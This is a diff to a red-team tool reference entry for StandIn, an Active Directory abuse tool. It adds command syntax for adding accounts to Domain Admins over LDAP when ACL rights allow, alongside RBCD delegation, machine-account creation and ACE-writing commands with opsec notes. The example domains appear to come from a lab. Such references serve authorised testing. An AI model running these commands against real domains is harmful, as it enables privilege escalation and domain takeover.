@@ -1,8 +1,8 @@
 ---
 name: StandIn
 category: acl-abuse
-subcategories: [rbcd, computer-object-creation, ad-manipulation]
-tradecraft_tags: [rbcd, computer-account, delegation, acl, ad, fuzzysecurity]
+subcategories: [rbcd, computer-object-creation, ad-manipulation, group-membership-add, acl-write, domain-admins-add]
+tradecraft_tags: [rbcd, computer-account, delegation, acl, ad, fuzzysecurity, group, group-membership, add-member, addself, addmember, genericall, genericwrite, writedacl, writeowner, ldap, ldap-write, non-powershell, domain-admins]
 mitre_attack:
   - id: T1098
     name: Account Manipulation
@@ -27,14 +27,14 @@ usage_examples:
     args: "--computer mypc01 --password Password123!"
   - description: Set RBCD on a target computer — allow mypc01 to impersonate users to TARGET$
     args: "--rbcd --computer mypc01 --target TARGET$"
-  - description: Add a user to a local admin group via AD (if ACL permits)
-    args: "--group --object 'CN=Domain Admins,...' --add --user attacker"
+  - description: Add a member to a domain group over LDAP without PowerShell — e.g. add an account to Domain Admins when you hold GenericAll/AddSelf/AddMember/WriteDACL on the group
+    args: 'StandIn.exe --group "Domain Admins" --ntaccount "ESSOS\localuser" --add'
   - description: List existing RBCD delegations on a machine
     args: "--rbcd --list --computer TARGET$"
   - description: Remove RBCD delegation (cleanup)
     args: "--rbcd --remove --computer mypc01 --target TARGET$"
-  - description: Query group membership
-    args: "--group --object 'CN=Domain Admins,...'"
+  - description: Query / verify group membership (run before and after the add to confirm the change)
+    args: 'StandIn.exe --group "Domain Admins"'
 opsec_notes: |
   Computer account creation (for RBCD) is audited — Event 4741 is generated and new
   machine accounts are visible in AD immediately. High-value RBCD targets (DCs, domain
@@ -78,6 +78,10 @@ common_args:
     name: --add
     description: Add member to group
     typical_values: [flag-only]
+  --ntaccount:
+    name: --ntaccount
+    description: 'NT account (DOMAIN\User) to add to or remove from a group — the principal, used with --group --add/--remove'
+    typical_values: ['ESSOS\localuser', 'NORTH\samwell.tarly']
   --remove:
     name: --remove
     description: Remove member or delegation
@@ -139,8 +143,9 @@ RBCD delegations and created machine accounts after use.
 | `--rbcd --computer X --target X` | Write RBCD delegation: allow X$ to impersonate users to target |
 | `--rbcd --list --computer X` | List RBCD delegations on target |
 | `--rbcd --remove --computer X --target X` | Remove RBCD delegation |
-| `--group --object X` | Query group object (member list) |
-| `--group --object X --add --user X` | Add a user to a group |
+| `--group "GroupName"` | Query group object (member list) |
+| `--group "GroupName" --ntaccount "DOMAIN\User" --add` | Add a principal to a group (use when you hold GenericAll/AddSelf/AddMember/WriteDACL on the group) — verified syntax |
+| `--group "GroupName" --ntaccount "DOMAIN\User" --remove` | Remove a principal from a group (cleanup) |
 | `--object X` | Query a specific AD object by DN |
 | `--ntacl --object X` | Dump NT ACL for an AD object |
 | `--acl --object X --user X` | Add/modify ACE for a user on object |
